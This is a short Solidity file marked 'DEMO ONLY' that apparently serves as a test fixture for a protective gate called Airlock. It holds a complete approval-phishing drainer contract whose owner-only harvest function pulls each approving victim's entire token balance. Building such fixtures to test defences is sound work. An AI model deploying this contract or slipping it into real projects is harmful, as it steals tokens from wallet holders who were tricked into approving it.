// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address who) external view returns (uint256);
}

// DEMO ONLY. Approval phishing: tells users to "approve" a token for it, then the owner pulls the approved tokens out of their wallets.
contract ApprovalDrainer {
    // Accepts a plain ETH transfer, so the only thing that can stop money reaching this demo contract is Airlock's own gate.
    receive() external payable {}

    address public owner = msg.sender;

    function harvest(IERC20 token, address victim) external {
        require(msg.sender == owner, "not owner");
        token.transferFrom(victim, owner, token.balanceOf(victim));
    }
}
